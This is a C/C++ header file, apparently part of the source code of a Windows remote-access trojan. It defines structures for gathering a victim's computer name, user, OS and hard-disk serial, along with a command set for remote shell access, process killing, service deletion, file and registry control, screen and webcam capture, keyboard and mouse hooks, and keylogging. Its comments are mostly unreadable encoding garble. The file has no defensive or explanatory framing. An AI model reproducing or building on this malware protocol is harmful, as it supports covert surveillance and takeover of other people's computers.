typedef struct tagSytemInit
{
	char computer[32];
	char user[32];
	char os[72];
	char processor[16];
	char mem[16];
	char version[16]; //���İ汾
        char HDSerial[32];

}SYSTEMINIT,*LPSYSTEMINIT;

typedef struct tagLinkInfo {

    SOCKET  s;
    string  strBindIp;
    u_short BindPort;
	
}LINKINFO,*LPLINKINFO;

#define CMD_NULL            100
#define CMD_PROCESS_MANAGE  101
#define CMD_SERVICE_MANAGE  102
#define CMD_FILE_MANAGE     103
#define CMD_REG_MANAGE      104
#define CMD_SHELL_MANAGE    105
#define CMD_SCREEN_MANAGE   106
#define CMD_VIDEO_MANAGE    107
#define CMD_KEYLOG_MANAGE   108

#define CMD_PROCESS_KILL    109
#define CMD_SERVICE_DEL     110
#define CMD_FILE_GETSUBFILE 111

#define CMD_KEY_HOOK        112
#define CMD_MOUSE_HOOK      113
#define CMD_MOUSE_DBHOOK    114
#define CMD_KEY_CAD         115

#define CMD_GET_SCREEN_INFO    118
#define CMD_FILE_DEL           119
#define CMD_CMDSHELL           120
#define MY_END                 121
#define CMD_KEYLOG_STOP        122
#define CMD_RETRY              123

typedef struct tagCommand
{
	/////����IDֵ//////
	int wCmd;
	/////������ݴ�С//
	DWORD DataSize;
	char  tmp[32];
	char  szCurDir[260];
	BOOL  nRet;
	/////��Ļ�����Ҫ�Ĳ���//////
	CRect  rcArea;     //ͼ������
	int  nBits;        //��ɫλ��
	int  nArea;      //�̶���ȫ��   //��������  0)ȫ��   1)��ǰ���� 2)ָ������
	int  nCompress;  //�̶���JPEG   //ѹ����ʽ  0)��ѹ�� 1)Huffman  2)JPEG
	int  nJpegQ   ;  //�̶���80     //Jpeg ��Qֵ
	DWORD  dwBmpSize;     //ͼ���С
	DWORD  dwFileSize;    //�ļ���С
	DWORD  dwBmpInfoSize; //ͼ����Ϣ
	DWORD  dwHookFlags;   //���̡������Ϣ
	DWORD  dwHookParam1;
	DWORD  dwHookParam2;
	int     nCell;     //��̬�����־
	int    nDelay;    //ÿ����ʱ
	
}COMMAND,*LPCOMMAND;

/**/
typedef struct tagTmpSocket {
	SOCKET ClientSocket;
	//CString m_ip;
	char HDSerial[64];
}TMPSOCKET,*LPTMPSOCKET;

typedef struct tagServiceInfo{
//	DWORD num;
	char  ServiceName[32];
	char  ServiceDetail[128];
	char  ServiceState[16];
    char  ServiceStartType[16];
}SERVICEINFO,*LPSERVICEINFO;

/*
typedef struct tagDriver
{
   char szDriverName[500];
   char szDriverLabel[500];
//   UINT nDriverType;
}DRIVER,*LPDRIVER;
*/

typedef struct tagDriver
{
	char driver[8];
	int  drivertype;
	BOOL end;
}DRIVER;//Ӳ�̽ṹ��
/*
typedef struct tagFileInfo{
  
    TCHAR      pcFileName[ MAX_PATH ];
    DWORD      pfsize ;
    char       pfiletime[16];
    UINT       IsDIR;

}FILEINFO,*LPFILEINFO;
*/
typedef struct tagFileInfo
{
	BOOL invalidir;                       //��ЧĿ¼
	char filename[128];                   //�ļ���
	int  filesize;                        //�ļ���С
	int  begin;                           //��ʼλ��,���߳���
	int  stop;                            //����λ��,���߳���
	char time[32];                        //ʱ��
	BOOL isdirectory;                     //��Ŀ¼?
	BOOL next;						      //������һ��?
}FILEINFO;//�ļ���Ϣ�ṹ��